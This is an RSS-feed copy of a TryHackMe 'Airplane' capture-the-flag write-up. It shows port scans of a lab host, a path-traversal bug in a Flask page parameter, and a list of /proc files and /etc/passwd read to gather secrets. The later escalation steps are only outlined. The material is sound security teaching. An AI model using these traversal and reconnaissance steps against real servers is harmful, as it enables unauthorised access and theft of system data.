@@ -1,0 +1,337 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>/Proc on</title><link>https://h4r1337.github.io/tags/proc/</link><description>Recent content in /Proc on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 29 Jul 2024 19:14:03 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/proc/index.xml" rel="self" type="application/rss+xml"/><item><title>Airplane | TryHackMe</title><link>https://h4r1337.github.io/posts/airplane/</link><pubDate>Mon, 29 Jul 2024 19:14:03 +0530</pubDate><guid>https://h4r1337.github.io/posts/airplane/</guid><description>&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Airplane
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Airplane is a medium level linux box. In this box you will use a path traversal bug to collect information from &lt;code>/proc&lt;/code> directory about a gdbserver. We will get initial access into the box as user &lt;code>hudson&lt;/code> by exploiting the gdb remote debugging server. From there it is a relatively easy privilege escalation by exploiting a suid in &lt;code>find&lt;/code> command to escalate as user &lt;code>carlos&lt;/code> and from there into exploiting a wildcard entry in sudoers.&lt;/p></description><content>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Airplane
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Airplane is a medium level linux box. In this box you will use a path traversal bug to collect information from &lt;code>/proc&lt;/code> directory about a gdbserver. We will get initial access into the box as user &lt;code>hudson&lt;/code> by exploiting the gdb remote debugging server. From there it is a relatively easy privilege escalation by exploiting a suid in &lt;code>find&lt;/code> command to escalate as user &lt;code>carlos&lt;/code> and from there into exploiting a wildcard entry in sudoers.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scanned all TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>rustscan -a 10.10.121.174
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#fe8019">{}&lt;/span> &lt;span style="color:#fe8019">}&lt;/span>| &lt;span style="color:#fe8019">{&lt;/span> &lt;span style="color:#fe8019">}&lt;/span> |&lt;span style="color:#fe8019">{&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>__ &lt;span style="color:#fe8019">{&lt;/span>_ _&lt;span style="color:#fe8019">}{&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>__ / ___&lt;span style="color:#fe8019">}&lt;/span> / &lt;span style="color:#fe8019">{}&lt;/span> &lt;span style="color:#b8bb26">\ &lt;/span>| &lt;span style="color:#b8bb26">`&lt;/span>| |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| .-. &lt;span style="color:#b8bb26">\|&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>_&lt;span style="color:#fe8019">}&lt;/span> |.-._&lt;span style="color:#fe8019">}&lt;/span> &lt;span style="color:#fe8019">}&lt;/span> | | .-._&lt;span style="color:#fe8019">}&lt;/span> &lt;span style="color:#fe8019">}&lt;/span>&lt;span style="color:#b8bb26">\ &lt;/span> &lt;span style="color:#fe8019">}&lt;/span>/ /&lt;span style="color:#b8bb26">\ &lt;/span> &lt;span style="color:#b8bb26">\|&lt;/span> |&lt;span style="color:#b8bb26">\ &lt;/span> |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">`&lt;/span>-&lt;span style="color:#b8bb26">&amp;#39; `-&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">`&lt;/span>-----&lt;span style="color:#b8bb26">&amp;#39;`----&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">`&lt;/span>-&lt;span style="color:#b8bb26">&amp;#39; `----&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">`&lt;/span>---&lt;span style="color:#b8bb26">&amp;#39; `-&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">`&lt;/span>-&lt;span style="color:#b8bb26">&amp;#39;`-&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">`&lt;/span>-&amp;#39;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>The Modern Day Port Scanner.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>________________________________________
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>: http://discord.skerritt.blog :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>: https://github.com/RustScan/RustScan :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --------------------------------------
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>😵 https://admin.tryhackme.com
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Open 10.10.121.174:22
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Open 10.10.121.174:6048
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Open 10.10.121.174:8000
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p22,8000,6048 -sC -sV --min-rate&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">10000&lt;/span> 10.10.121.174 -oA nmap/services
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## Nmap 7.80 scan initiated Mon Jul 29 17:10:23 2024 as: nmap -p22,8000,6048 -sC -sV -vv --min-rate 10000 -oA nmap/services 10.10.121.174&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> airplane.thm &lt;span style="color:#fe8019">(&lt;/span>10.10.121.174&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received conn-refused &lt;span style="color:#fe8019">(&lt;/span>0.46s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-07-29 17:10:23 IST &lt;span style="color:#fe8019">for&lt;/span> 195s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>6048/tcp open x11? syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8000/tcp open http-alt syn-ack Werkzeug/3.0.2 Python/3.8.10
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| fingerprint-strings:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| FourOhFourRequest:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| HTTP/1.1 &lt;span style="color:#d3869b">404&lt;/span> NOT FOUND
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Server: Werkzeug/3.0.2 Python/3.8.10
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Date: Mon, &lt;span style="color:#d3869b">29&lt;/span> Jul &lt;span style="color:#d3869b">2024&lt;/span> 11:40:38 GMT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Content-Type: text/html; charset&lt;span style="color:#fe8019">=&lt;/span>utf-8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Content-Length: &lt;span style="color:#d3869b">207&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Connection: close
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;!doctype html&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;html lang&lt;span style="color:#fe8019">=&lt;/span>en&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;p&amp;gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&amp;lt;/p&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| GetRequest:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| HTTP/1.1 &lt;span style="color:#d3869b">302&lt;/span> FOUND
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Server: Werkzeug/3.0.2 Python/3.8.10
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Date: Mon, &lt;span style="color:#d3869b">29&lt;/span> Jul &lt;span style="color:#d3869b">2024&lt;/span> 11:40:32 GMT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Content-Type: text/html; charset&lt;span style="color:#fe8019">=&lt;/span>utf-8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Content-Length: &lt;span style="color:#d3869b">269&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Location: http://airplane.thm:8000/?page&lt;span style="color:#fe8019">=&lt;/span>index.html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Connection: close
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;!doctype html&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;html lang&lt;span style="color:#fe8019">=&lt;/span>en&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;title&amp;gt;Redirecting...&amp;lt;/title&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;h1&amp;gt;Redirecting...&amp;lt;/h1&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;p&amp;gt;You should be redirected automatically to the target URL: &amp;lt;a href&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;http://airplane.thm:8000/?page=index.html&amp;#34;&lt;/span>&amp;gt;http://airplane.thm:8000/?page&lt;span style="color:#fe8019">=&lt;/span>index.html&amp;lt;/a&amp;gt;. If not, click the link.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Socks5:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;!DOCTYPE HTML PUBLIC &lt;span style="color:#b8bb26">&amp;#34;-//W3C//DTD HTML 4.01//EN&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b8bb26">&amp;#34;http://www.w3.org/TR/html4/strict.dtd&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;html&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;meta http-equiv&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;Content-Type&amp;#34;&lt;/span> content&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;text/html;charset=utf-8&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;title&amp;gt;Error response&amp;lt;/title&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;h1&amp;gt;Error response&amp;lt;/h1&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;p&amp;gt;Error code: 400&amp;lt;/p&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;p&amp;gt;Message: Bad request syntax &lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">| &amp;#39;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>.&amp;lt;/p&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;p&amp;gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&amp;lt;/p&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &amp;lt;/html&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: HEAD GET OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-title: About Airplanes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_Requested resource was http://airplane.thm:8000/?page&lt;span style="color:#fe8019">=&lt;/span>index.html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">1&lt;/span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SF-Port8000-TCP:V&lt;span style="color:#fe8019">=&lt;/span>7.80%I&lt;span style="color:#fe8019">=&lt;/span>7%D&lt;span style="color:#fe8019">=&lt;/span>7/29%Time&lt;span style="color:#fe8019">=&lt;/span>66A77FB0%P&lt;span style="color:#fe8019">=&lt;/span>x86_64-pc-linux-gnu%r&lt;span style="color:#fe8019">(&lt;/span>Ge
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SF:tRequest,1F3,&lt;span style="color:#b8bb26">&amp;#34;HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:x20Python/3\.8\.10\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2011:40:32\x2
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.html\r\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:nConnection:\x20close\r\n\r\n&amp;lt;!doctype\x20html&amp;gt;\n&amp;lt;html\x20lang=en&amp;gt;\n&amp;lt;ti
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:tle&amp;gt;Redirecting\.\.\.&amp;lt;/title&amp;gt;\n&amp;lt;h1&amp;gt;Redirecting\.\.\.&amp;lt;/h1&amp;gt;\n&amp;lt;p&amp;gt;You\x20sh
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:ould\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF::\x20&amp;lt;a\x20href=\&amp;#34;http://airplane\.thm:8000/\?page=index\.html\&amp;#34;&amp;gt;http:/
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:/airplane\.thm:8000/\?page=index\.html&amp;lt;/a&amp;gt;\.\x20If\x20not,\x20click\x20
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:the\x20link\.\n&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>%r&lt;span style="color:#fe8019">(&lt;/span>FourOhFourRequest,184,&lt;span style="color:#b8bb26">&amp;#34;HTTP/1\.1\x20404\x20NOT\x20F
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:OUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20Mon,
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\x2029\x20Jul\x202024\x2011:40:38\x20GMT\r\nContent-Type:\x20text/html;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\r\n&amp;lt;!doctype\x20html&amp;gt;\n&amp;lt;html\x20lang=en&amp;gt;\n&amp;lt;title&amp;gt;404\x20Not\x20Found&amp;lt;/
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:title&amp;gt;\n&amp;lt;h1&amp;gt;Not\x20Found&amp;lt;/h1&amp;gt;\n&amp;lt;p&amp;gt;The\x20requested\x20URL\x20was\x20not
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20UR
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:L\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20a
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:gain\.&amp;lt;/p&amp;gt;\n&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>%r&lt;span style="color:#fe8019">(&lt;/span>Socks5,213,&lt;span style="color:#b8bb26">&amp;#34;&amp;lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&amp;#34;-//W3C//D
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:TD\x20HTML\x204\.01//EN\&amp;#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\&amp;#34;http://www
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\.w3\.org/TR/html4/strict\.dtd\&amp;#34;&amp;gt;\n&amp;lt;html&amp;gt;\n\x20\x20\x20\x20&amp;lt;head&amp;gt;\n\x20
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\x20\x20\x20\x20\x20\x20\x20&amp;lt;meta\x20http-equiv=\&amp;#34;Content-Type\&amp;#34;\x20con
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:tent=\&amp;#34;text/html;charset=utf-8\&amp;#34;&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&amp;lt;tit
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:le&amp;gt;Error\x20response&amp;lt;/title&amp;gt;\n\x20\x20\x20\x20&amp;lt;/head&amp;gt;\n\x20\x20\x20\x20
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:&amp;lt;body&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&amp;lt;h1&amp;gt;Error\x20response&amp;lt;/h1&amp;gt;\n\x2
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:0\x20\x20\x20\x20\x20\x20\x20&amp;lt;p&amp;gt;Error\x20code:\x20400&amp;lt;/p&amp;gt;\n\x20\x20\x20
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\x20\x20\x20\x20\x20&amp;lt;p&amp;gt;Message:\x20Bad\x20request\x20syntax\x20\(&amp;#39;\\x05
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03&amp;#39;\)\.&amp;lt;/p&amp;gt;\n\x20\x20\x20\x2
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:0\x20\x20\x20\x20&amp;lt;p&amp;gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_RE
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:QUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">SF:&amp;lt;/p&amp;gt;\n\x20\x20\x20\x20&amp;lt;/body&amp;gt;\n&amp;lt;/html&amp;gt;\n&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Read data files from: /usr/bin/../share/nmap
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## Nmap done at Mon Jul 29 17:13:38 2024 -- 1 IP address (1 host up) scanned in 195.14 seconds&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;h3 id="port-8000---http-flask-302">Port 8000 - HTTP (Flask 3.0.2)&lt;/h3>
+&lt;p>Going to port 8000 redirect us to &lt;code>airplane.thm:8000/?page=index.html&lt;/code>
+Let&amp;rsquo;s add &lt;code>airplane.thm&lt;/code> to &lt;code>/etd/hosts&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#39;10.10.121.174\tairplane.thm&amp;#39;&lt;/span> | sudo tee -a /etc/hosts
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729170637.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="path-traversal">Path traversal&lt;/h3>
+&lt;p>After seeing the &lt;code>page&lt;/code> parameter I first tried path traversal.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729171235.webp">&lt;/figure>
+&lt;p>It worked. I am using &lt;a href="https://httpie.io/">httpie&lt;/a> btw.&lt;/p>
+&lt;p>Since the website is running on flask I tried if we can access &lt;code>/console&lt;/code>. Often if we have
+access to the debug console we can use path traversal to get some system information for
+generating the console pin and getting a remote shell.
+You can check &lt;a href="https://www.daehee.com/blog/werkzeug-console-pin-exploit">this article&lt;/a> to find more about this attack.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729171659.webp">&lt;/figure>
+&lt;p>But as you can see the debug mode is not enabled.&lt;/p>
+&lt;p>Next I tried to retrieve ssh keys if there&amp;rsquo;s any. From the &lt;code>/etc/passwd&lt;/code> file we can see that there are 3 users: &lt;code>root&lt;/code>, &lt;code>carlos&lt;/code>, and &lt;code>hudson&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729172000.webp">&lt;/figure>
+&lt;p>It does not exists or the current user can&amp;rsquo;t access it maybe because we are &lt;code>www-data&lt;/code> or something. In linux if we have a path traversal we can use some files in the &lt;code>/proc&lt;/code> directory to retrieve valuable informations about the machine.
+Check &lt;a href="https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#the-proc-file-system">this article&lt;/a> for more info about this attack vector. Here are some of the locations that you can check:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">/&lt;/span>proc&lt;span style="color:#fe8019">/&lt;/span>version &lt;span style="color:#fe8019">-&lt;/span> Kernel version
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">/&lt;/span>proc&lt;span style="color:#fe8019">/&lt;/span>self&lt;span style="color:#fe8019">/&lt;/span>environ &lt;span style="color:#fe8019">-&lt;/span> &lt;span style="color:#fb4934">Environment&lt;/span> variables of the current process
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">/&lt;/span>proc&lt;span style="color:#fe8019">/&lt;/span>self&lt;span style="color:#fe8019">/&lt;/span>cmdline &lt;span style="color:#fe8019">-&lt;/span> Process invocation command with parameters
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">/&lt;/span>proc&lt;span style="color:#fe8019">/&lt;/span>self&lt;span style="color:#fe8019">/&lt;/span>cwd&lt;span style="color:#fe8019">/&lt;/span> &lt;span style="color:#fe8019">-&lt;/span> Points to the current working directory
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">/&lt;/span>proc&lt;span style="color:#fe8019">/&lt;/span>sched_debug &lt;span style="color:#fe8019">-&lt;/span> Scheduling information &lt;span style="color:#fe8019">and&lt;/span> running processes per CPU
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729174648.webp">&lt;/figure>
+&lt;p>Unfortunately &lt;code>http&lt;/code> does not output binary data. Note that the content of the &lt;code>/proc/self/environ&lt;/code> is marked as binary data because it is using null bytes as a seperator instead
+of using new line (&lt;code>\n&lt;/code>) or space.
+So back to &lt;code>curl&lt;/code> again&amp;hellip;&lt;/p>
